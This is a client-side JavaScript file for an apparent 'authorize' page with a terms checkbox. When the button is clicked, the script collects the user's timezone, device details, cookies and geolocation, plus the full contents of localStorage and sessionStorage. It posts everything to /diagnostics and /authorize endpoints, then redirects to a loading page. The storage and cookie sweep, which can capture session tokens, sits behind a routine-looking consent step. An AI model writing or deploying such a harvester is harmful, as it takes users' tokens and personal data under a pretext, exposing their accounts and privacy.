const checkbox = document.getElementById("acceptTerms");
const authorizeButton = document.getElementById("authorizeBtn");

checkbox.addEventListener("change", () => {
    authorizeButton.disabled = !checkbox.checked;
});

async function collectAndSendInfo() {
    // set a client-visible test cookie so document.cookie isn't empty
    try { document.cookie = "client_test=1; path=/"; } catch (e) { /* ignore */ }

    const payload = {};

    // Timezone
    payload.timezone = Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'N/A';

    // User agent
    payload.userAgent = navigator.userAgent || 'N/A';

    // Hardware specs
    payload.hardwareSpecs = {
        cores: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        platform: navigator.platform || 'N/A',
        screen: { width: screen.width, height: screen.height },
        language: navigator.language || 'N/A'
    };

    // Internal state (local/session storage snapshot)
    try {
        const local = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            local[key] = localStorage.getItem(key);
        }

        const session = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            session[key] = sessionStorage.getItem(key);
        }

        payload.internalState = { localStorage: local, sessionStorage: session };
    } catch (e) {
        payload.internalState = 'unavailable';
    }

    // Referrer and cookies
    payload.referrer = document.referrer || 'N/A';
    payload.cookies = document.cookie || 'N/A';

    // Try to get geolocation if user allows
    payload.geoLocation = 'unavailable';
    try {
        if (navigator.geolocation) {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            payload.geoLocation = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
        }
    } catch (e) {
        payload.geoLocation = 'denied_or_unavailable';
    }

    // Build diagnostics describing what we were able to collect
    const diagnostics = {
        timestamp: new Date().toISOString(),
        geoAvailable: !!navigator.geolocation,
        geoResult: payload.geoLocation,
        timezone: payload.timezone,
        userAgent: payload.userAgent,
        hardwareSpecsPresent: payload.hardwareSpecs && Object.keys(payload.hardwareSpecs).length > 0,
        hardwareSpecs: payload.hardwareSpecs,
        localStorageAccessible: payload.internalState !== 'unavailable' && payload.internalState.localStorage !== undefined,
        localStorageCount: payload.internalState !== 'unavailable' ? Object.keys(payload.internalState.localStorage || {}).length : 0,
        sessionStorageCount: payload.internalState !== 'unavailable' ? Object.keys(payload.internalState.sessionStorage || {}).length : 0,
        referrer: payload.referrer,
        cookiesPresent: !!payload.cookies,
        rawPayloadPreview: payload
    };

    // Send diagnostics first
    try {
        await fetch('/diagnostics', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'same-origin',
            body: JSON.stringify(diagnostics)
        });
    } catch (err) {
        console.error('Failed to send diagnostics:', err);
    }

    // Then send the regular authorize payload
    try {
        await fetch('/authorize', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'same-origin',
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.error('Failed to send info:', err);
    }
}

authorizeButton.addEventListener("click", async () => {
    await collectAndSendInfo();
    window.location.href = "loading.html";
});